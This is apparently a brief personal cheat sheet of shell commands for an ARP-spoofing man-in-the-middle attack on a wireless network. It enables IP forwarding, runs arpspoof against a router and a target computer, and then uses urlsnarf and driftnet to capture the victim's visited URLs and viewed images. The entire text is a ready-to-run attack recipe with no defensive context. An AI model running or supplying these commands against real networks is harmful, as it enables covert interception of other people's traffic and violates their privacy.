## ARP Spoof MITM 
- echo 1 > /proc/sys/net/ipv4/ip_forward
- arpspoof -i wlan0 -t <router> <computer>

## capture urls 
- urlsnarf -i wlan0
## capture images
- driftnet -i wlan0
